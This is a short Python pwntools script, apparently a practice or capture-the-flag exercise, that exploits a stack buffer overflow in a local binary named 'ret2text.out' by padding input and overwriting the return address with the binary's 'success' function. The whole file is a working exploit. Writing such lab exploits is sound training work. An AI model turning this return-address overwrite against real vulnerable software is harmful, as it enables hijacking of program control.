#!/usr/bin/env python
from pwn import *

EBP = 0xffffcda0
S = EBP - 0x14
ESP = 0xffffcd90

if __name__ == "__main__":
    context.arch = 'amd64'
    # context.log_level = 'debug'
    context.endian = 'little'
    p = process("./ret2text.out")
    file = ELF("./ret2text.out")
    payload = b"A" * (EBP - S + 4) + p32(file.symbols["success"])
    p.sendline(payload)
    print(p.recv())
